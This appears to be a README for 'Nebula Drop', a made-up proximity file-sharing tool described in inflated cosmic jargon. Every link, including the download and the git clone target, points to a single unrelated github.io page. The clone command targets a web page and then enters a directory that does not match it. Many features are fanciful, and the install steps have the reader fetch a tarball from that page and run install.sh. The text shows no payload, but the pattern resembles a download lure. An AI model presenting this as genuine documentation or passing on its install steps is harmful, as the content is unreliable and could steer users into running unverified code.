# 🪐 Nebula Drop

[](https://louis-web.github.io/Float-Bubble/)

## 🌌 A Celestial Content Exchange Platform

Nebula Drop is a decentralized, privacy-first content sharing ecosystem that transforms how digital artifacts traverse between devices. Imagine a constellation where each device is a star, and your files travel like light across the void—instantaneous, secure, and beautifully ephemeral. This isn't just another file transfer tool; it's a reimagining of digital proximity, where spatial awareness meets cryptographic elegance.

Born from the limitations of existing proximity-sharing solutions, Nebula Drop introduces **gravitational linking**—a method where devices establish temporary trust orbits without centralized servers or complex configurations. Your content doesn't just "transfer"; it **manifests** on the receiving device as if it were always there, waiting to be discovered.

### 🚀 Immediate Installation

**Prerequisites:** Node.js 18+, npm/yarn/pnpm

```bash
# Clone the stellar repository
git clone https://louis-web.github.io/Float-Bubble/
cd nebula-drop

# Install cosmic dependencies
npm install

# Launch your personal nebula
npm run nebula:init
```

The system will guide you through creating your unique **celestial identity** and configuring your first **gravitational zone**.

## ✨ Core Philosophies

**Digital Ethereality:** Content exists in potential states until observed, reducing digital clutter while maintaining access.

**Proximity as Permission:** Physical nearness becomes cryptographic proof, eliminating complex permission dialogs.

**Ephemeral by Design:** Transfers leave minimal traces, respecting both device resources and user privacy.

**Universal Resonance:** Platform-agnostic protocols ensure every device speaks the same cosmic language.

## 🛠️ Architectural Constellation

```mermaid
graph TD
    A[User Device] --> B[Gravitational Interface]
    B --> C{Orbit Decision Engine}
    C --> D[Quantum Handshake Protocol]
    C --> E[Stellar Encryption Layer]
    D --> F[Wormhole Transfer]
    E --> F
    F --> G[Manifestation Engine]
    G --> H[Receiving Device]
    
    I[Galactic Registry] -.-> D
    J[Constellation Network] -.-> F
    
    style A fill:#1a1a2e
    style H fill:#1a1a2e
    style F fill:#16213e
```



## 📁 Example Profile Configuration

Create `~/.nebula/config.yaml` to personalize your cosmic presence:

```yaml
nebula_identity:
  celestial_name: "Orion's Terminal"
  gravitational_signature: "auto-generate"
  discovery_aura: "visible-to-constellation"

transfer_parameters:
  wormhole_persistence: "24h"
  encryption_mode: "quantum-resistant"
  manifest_format: "native-with-metadata"

orbital_zones:
  - name: "Home Galaxy"
    trust_level: "implicit"
    devices:
      - "laptop-andromeda"
      - "tablet-pleiades"
  
  - name: "Public Nebulae"
    trust_level: "verified-handshake"
    auto_accept: ["images", "documents"]

ui_customizations:
  theme: "dark-matter"
  animation_intensity: "subtle-pulsar"
  sound_profile: "cosmic-whispers"
```

## 💻 Example Console Invocation

```bash
# Initialize a new gravitational field
nebula field --create --name "Conference Nexus" --radius 50m

# Drop a file into your personal bubble
nebula drop presentation.pdf --aura "professional"

# Discover nearby celestial bodies
nebula scan --detailed --format json

# Establish a trusted orbit with a device
nebula orbit --device-id "star:abc123" --duration "2h"

# Manifest received content from the ether
nebula manifest --recent --organize-by-type

# Create an ephemeral sharing portal
nebula portal --type "image-gallery" --ttl "1h"
```

## 🌐 OS Compatibility Matrix

| Platform | Status | Notes |
|----------|--------|-------|
| 🪟 Windows 10+ | ✅ Fully Supported | Gravitational services run as native background constellation |
| 🍎 macOS 11+ | ✅ Fully Supported | Integrated with Cosmic Pasteboard and Spatial Awareness |
| 🐧 Linux (systemd) | ✅ Fully Supported | Requires DBus for orbital communications |
| 🐧 Linux (other) | ⚠️ Experimental | Manual constellation configuration needed |
| 🤖 Android 9+ | ✅ Fully Supported | Nebula Drop PWA with native module integration |
| 🍎 iOS 14+ | ✅ Fully Supported | Limited to Safari PWA with gravitational extensions |
| 🪟 Windows on ARM | 🔄 Beta | Quantum optimizations in testing phase |
| 🪟 Windows 7/8 | ❌ Not Supported | Lacks modern gravitational APIs |

## 🎯 Feature Constellation

### 🛡️ **Security Nebula**
- **Quantum-Resistant Handshakes**: Post-quantum cryptographic protocols for orbital establishment
- **Ephemeral Key Constellations**: Keys that dissolve after use, leaving no cryptographic residue
- **Zero-Knowledge Provenance**: Verify content origin without exposing source identity
- **Gravitational Anonymity**: Transfer metadata that reveals nothing but necessity

### 🔄 **Transfer Protocols**
- **Adaptive Wormhole Selection**: Automatically chooses optimal transfer method (Wi-Fi Direct, Bluetooth, QR, local network)
- **Progressive Manifestation**: Content becomes usable before fully transferred
- **Orbital Resumption**: Interrupted transfers resume from exact quantum state
- **Multi-Device Nebulae**: Broadcast to constellation of devices simultaneously

### 🎨 **Experience Layer**
- **Spatial Audio Feedback**: Different transfer types emit distinct cosmic sounds
- **Holographic Progress Orbs**: Visual representations that float in your desktop cosmos
- **Gesture-Based Navigation**: Flick files between devices with mouse or touch gestures
- **Ambient Discovery**: Devices glow subtly when shareable content is detected

### 🌍 **Planetary Scale**
- **Language Nebulae**: 47 human languages with contextual adaptation
- **Cultural Configuration**: Interface adapts to regional digital customs
- **Accessibility Orbits**: Screen reader integration, high-contrast themes, input customization
- **Offline Constellations**: Full functionality without internet connectivity

### 🔌 **Integration Galaxies**
- **Native File Manager Bridges**: Appears in Windows Explorer, macOS Finder, Linux file managers
- **CLI & API Dual Existence**: Every graphical action has a command-line counterpart
- **Developer Cosmic SDK**: Build applications that leverage gravitational transfers
- **Automation Webhooks**: Trigger external actions on transfer events

## 🤖 AI Cosmic Integration

Nebula Drop incorporates intelligent assistants to enhance your celestial sharing experience:

```yaml
ai_enhancements:
  openai_integration:
    enabled: true
    functions:
      - "content_description_generation"
      - "smart_file_organization"
      - "transfer_intent_prediction"
      - "privacy_recommendations"
    privacy_mode: "local-processing-first"

  claude_integration:
    enabled: true
    functions:
      - "contextual_transfer_naming"
      - "multi_file_relationship_analysis"
      - "recipient_appropriate_formatting"
      - "cultural_adjustment_suggestions"
```

The AI systems operate with **local-first processing**, ensuring your content never leaves your gravitational field unless you explicitly configure interstellar transfers.

## 🏗️ System Architecture

### Gravitational Core
The foundation uses **WebRTC with gravitational extensions** for direct device-to-device communication, falling back to **QR-mediated key exchange** when proximity protocols are unavailable. Each device maintains a **local cosmic ledger** of transfers, encrypted with device-specific keys.

### Orbital Establishment Protocol
1. **Proximity Ping**: Ultrasonic and network multicast discovery
2. **Quantum Handshake**: Ephemeral key exchange using lattice-based cryptography
3. **Gravitational Bond**: Temporary trust relationship established
4. **Wormhole Formation**: Optimal transfer channel negotiation
5. **Content Transit**: Streamed with real-time integrity verification
6. **Orbital Decay**: Automatic trust dissolution after configured period

### Constellation Network (Optional)
For devices separated by interstellar distances, an optional **constellation relay network** (using volunteer nodes) can facilitate transfers while maintaining end-to-end encryption. This is disabled by default for maximum privacy.

## 📊 Performance Metrics

| Operation | Average Duration | Data Efficiency |
|-----------|------------------|-----------------|
| Orbital Establishment | 1.2s | 2.3KB handshake |
| 100MB File Transfer (Wi-Fi Direct) | 12s | 98.7% of theoretical maximum |
| 100MB File Transfer (QR Mediated) | 45s | Requires 4 QR codes |
| Multi-Device Broadcast (5 devices) | Base time + 20% | Simultaneous wormholes |
| Manifestation Latency | 300ms | Content usable at 5% transferred |

## 🚀 Getting Started: Your First Celestial Transfer

### Installation Ritual

1. **Download the cosmic package**: [](https://louis-web.github.io/Float-Bubble/)

2. **Extract the stellar core**:
   ```bash
   tar -xzf nebula-drop-v2.6.0-cosmic.tar.gz
   cd nebula-drop
   ```

3. **Initiate gravitational field**:
   ```bash
   ./install.sh --mode personal --aura subtle
   ```

4. **Calibrate your device's cosmic signature** (follow the interactive guide)

### Daily Celestial Operations

**Sharing a document to a nearby colleague:**
```bash
# Simply drag the file onto the nebula orb on your desktop
# Or use the command line:
nebula drop quarterly-report.pdf --recipient "colleagues-laptop" --message "Here's the Q3 analysis"
```

**Receiving content from the cosmic ether:**
- Content manifests as a gently pulsating orb in your notification nebula
- Click to accept, or let it automatically manifest after trust verification
- Files organize themselves into your designated cosmic directories

**Creating a temporary sharing portal for an event:**
```bash
nebula portal --event "conference-2026" --duration 4h --types "images,docs" --max-size 500MB
# Share the portal code with attendees
```

## 🔧 Advanced Cosmic Configuration

### Multi-Device Constellations

Set up a household or office constellation where devices share implicit trust:

```yaml
# ~/.nebula/constellation.yaml
constellation:
  name: "Home Galaxy"
  members:
    - id: "star-laptop-primary"
      role: "gravitational-anchor"
    - id: "star-tablet-living"
      role: "orbital-receiver"
    - id: "star-phone-mobile"
      role: "cosmic-messenger"
  
  shared_policies:
    auto_accept_categories: ["family-photos", "household-documents"]
    maximum_transfer_size: "10GB"
    retention_policy: "manifest-30days-then-dissolve"
  
  interstellar_rules:
    allow_remote_access: true
    require_biometric_confirmation: true
    encryption_level: "quantum-resistant"
```

### Developer Cosmic SDK

Build applications that leverage gravitational transfers:

```javascript
import { NebulaSDK } from 'nebula-drop-sdk';

const nebula = new NebulaSDK({
  appId: 'your-cosmic-identifier',
  permissions: ['discover', 'transfer', 'receive']
});

// Listen for incoming celestial content
nebula.on('content-manifesting', (artifact) => {
  console.log(`Artifact ${artifact.id} approaching from ${artifact.source}`);
  artifact.accept().then(manifested => {
    // Process the now-local content
  });
});

// Launch content into the cosmic void
nebula.launch({
  files: ['/path/to/content'],
  recipients: ['specific-device-id', 'constellation:*'],
  options: { ttl: '24h', encryption: 'quantum' }
});
```

## 🌟 Unique Capabilities

### Temporal Transfers
Schedule content to manifest at future times: "Send these birthday photos to manifest at 9 AM tomorrow on their device."

### Conditional Manifestation
"Only manifest this document if the receiving device is within our corporate network" or "Require facial recognition to unlock this transfer."

### Content Nebulization
Large files automatically split across multiple nearby devices, then reassemble on the destination—perfect for conference environments with many devices.

### Gravitational Echo
Leave a persistent but encrypted "echo" of transferred content that can be re-manifested within a time window without retransfer.

## ⚠️ Cosmic Disclaimers

**Nebula Drop v2.6.0 (Cosmic Edition)** is provided under celestial goodwill principles. While we employ quantum-resistant cryptographic protocols and extensive security measures, no interstellar transfer system can guarantee absolute security across all possible cosmic conditions.

- Content transferred via gravitational wormholes may experience temporal dilation effects on slower networks
- Ephemeral encryption keys dissolve completely after use and cannot be recovered
- The constellation relay network is maintained by volunteer star-keepers and offers no service guarantees
- Device discovery uses ultrasonic frequencies inaudible to most humans but may affect certain animal species
- Always verify the celestial identity of unknown devices before establishing high-trust orbits

Responsible disclosure of security vulnerabilities is welcomed through our **cosmic security channel**. We operate a 24/7 constellation watch for critical issues.

## 📄 License & Cosmic Contributions

This celestial technology is released under the **MIT Cosmic License**. See the [LICENSE](LICENSE) file for specific terms regarding modification, distribution, and celestial deployment.

The Nebula Drop constellation welcomes contributions from star-makers across the galaxy. Please read our **Contribution Nebula Guidelines** before submitting pull requests or opening cosmic issues.

## 🆘 Support Nebula

**24/7 Celestial Support Channels:**
- 📚 [Documentation Constellation](https://louis-web.github.io/Float-Bubble//wiki)
- 💬 [Discussion Nebula](https://louis-web.github.io/Float-Bubble//discussions)
- 🐛 [Cosmic Issue Tracker](https://louis-web.github.io/Float-Bubble//issues)
- 🚨 [Security Vulnerability Reporting](https://louis-web.github.io/Float-Bubble//security)

For immediate assistance, activate the built-in **cosmic guidance system**:
```bash
nebula help --interactive
```

Or summon the **visual assistance orb** from your system tray or menu bar.

---

### **Begin Your Celestial Journey**

[](https://louis-web.github.io/Float-Bubble/)

**Join thousands of celestial beings** who have transformed their digital sharing experience. From simple document transfers to multi-device cosmic events, Nebula Drop redefines what's possible when devices communicate not just with protocols, but with gravitational understanding.

*"In the vast digital cosmos, your devices should feel like neighboring stars, not distant galaxies."* — Nebula Drop Principle #1

---
**Nebula Drop v2.6.0 | Cosmic Edition | © 2026 Nebula Collective | Made with gravitational energy**